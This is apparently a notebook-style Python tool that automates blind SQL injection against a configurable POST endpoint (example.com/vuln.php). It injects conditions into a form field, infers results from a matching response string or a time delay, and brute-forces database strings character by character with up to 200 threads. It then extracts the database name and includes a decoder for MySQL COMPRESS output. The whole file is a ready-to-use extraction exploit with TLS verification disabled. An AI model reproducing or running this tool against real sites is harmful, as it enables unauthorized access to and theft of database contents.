# @title config
import requests,re,time,sys,threading,json,zlib
from tqdm.notebook import tqdm

def uncompress_hex(hex_str):
    try:
        compressed_with_header = bytes.fromhex(hex_str)
        if len(compressed_with_header) < 5:
            raise ValueError("Data too short to contain valid MySQL COMPRESS header.")
        compressed_data = compressed_with_header[4:]
        uncompressed = zlib.decompress(compressed_data)
        return uncompressed.decode('utf-8')
    except Exception as e:
        print(f"[!] Error decompressing data: {e}")
        return None
def sqli_blind(condition):
    req = json.loads(json.dumps(request).replace('[t]', condition))
    time_before = time.time()
    try:
        response = requests.request(
            req['method'],
            req['url'],
            params={} if 'params' not in req else req['params'],
            data={} if 'data' not in req else req['data'],
            headers=req['headers'],
            proxies=proxies,
            verify=verify
        )
        html = response.text
    except KeyboardInterrupt:
        sys.exit()
    except:
        html = ''
    time_gap = time.time()-time_before
    if time_base['enabled'] and time_base['sleep'] < time_gap:
        return True
    elif response_match in html:
        return True
    return False
def nth_char(string, position):
    return "(SUBSTRING({0}, {1}, 1))".format(string, position)
def leng(string):
    return "(LENGTH({0}))".format(string)
def find_length(string_to_find):
    i = 1
    level = 0
    operator = ">"
    while True:
        if round(i) == 0:
            print('\n\n================SOMETHING WENT WRONG, PLEASE CHECK YOUR CONDITION================\n\n')
            exit()
        cond = leng(string_to_find)+operator+str(i)
        while True:
            try:
                INJ = sqli_blind(cond)
                break
            except KeyboardInterrupt:
                sys.exit()
            except Exception as e:
                print(repr(e))
                print('================ERR IN SQLI================')
                continue
        if INJ:
            print("length {0} {1}".format(operator, str(i)))
            if operator == ">" and re.match("^1(0+)?$", str(i)):
                level += 1
                i = 0
            if operator == "=":
                break
        else:
            print("length {0} {1} (False)".format(operator, str(i)))
            if operator == ">" and re.match("^1(0+)?$", str(i)) and level != 0:
                i = round(i/10)
                level -= 1
            elif operator == ">" and re.match("^1(0+)?$", str(i)) and level == 0:
                i -= 10**level
                operator = "="
            elif operator == ">" and level != 0:
                i -= 10**level
                level -= 1
            elif operator == ">" and level == 0:
                i -= 10**level
                operator = "="
        i += 10**level
    return i
def find_nth_char(string_get, i):
    alphabet = "0123456789abcdef"
    for j in range(len(alphabet)):
        cond = "{0} = '{1}'".format(nth_char(string_get, i), alphabet[j:j+1])
        while True:
            try:
                INJ = sqli_blind(cond)
                break
            except KeyboardInterrupt:
                sys.exit()
            except Exception as e:
                print(repr(e))
                print('================ERR IN SQLI================')
                continue
        if INJ:
            sqli_out[i] = alphabet[j:j+1]
            #print(f'Char @ {i} -------> {alphabet[j:j+1]}')
            pbar_finished.update(1)
            if is_multi_thread:
                lock.release()
            break
def find_it(length, string_get):
    threads = []
    for i in range(1, length+1):
        if is_multi_thread:
            lock.acquire()
            t = threading.Thread(target=find_nth_char, args=(string_get, i))
            t.start()
            threads.append(t)
            for t in threads:
                if not t.is_alive():
                    threads.remove(t)
            pbar_load.n = len(threads)
            pbar_load.refresh()
        else:
            find_nth_char(string_get, i)
    while is_multi_thread and True:
        if len(threads) == 0:
            break
        for t in threads:
            if not t.is_alive():
                threads.remove(t)
        pbar_load.n = len(threads)
        pbar_load.refresh()
    reveal = ""
    for i in range(1, length+1):
        reveal += sqli_out[i]
    return reveal
def find(query):
    global pbar_finished,pbar_load
    lenx = find_length(query)
    pbar_finished = tqdm(total=lenx, position=0, desc='Processed')
    pbar_load = tqdm(total=thread_limit, position=1, desc='Load')
    return find_it(lenx, query)

proxies = "" # @param {"type":"string","placeholder":"proxies"}
try:
    proxies = json.loads(proxies)
except:
    proxies = None
verify = False
requests.packages.urllib3.disable_warnings()
sqli_out = {}
thread_limit = 200 # @param {"type":"number","placeholder":"thread limit"}
lock = threading.Semaphore(thread_limit)
is_multi_thread = True
if thread_limit==1:
    is_multi_thread = False
time_base = {}
time_base['enabled'] = False # @param {"type":"boolean","placeholder":"time base"}
time_base['sleep'] = 2 # @param {"type":"integer","placeholder":"sleep in seconds"}

request = {
    'method': "POST",
    'url': "https://example.com/vuln.php",
    'headers': {
      "Content-Type": "application/x-www-form-urlencoded",
      "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36 EdgA/133.0.0.0",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
      "Accept-Encoding": "gzip, deflate, br, zstd",
    },
    'data': {
      "k": "v,1,2,[t]",
    }
}
response_match = 'you must submit details of two referees'
is_multi_thread = True
try:
    t = find("(select database())")
    print(t)
    try:
      print("{0} -> {1}".format(t, bytes.fromhex(t).decode("utf-8")))
    except:
      pass
except KeyboardInterrupt:
    sys.exit()
except:
    exit()
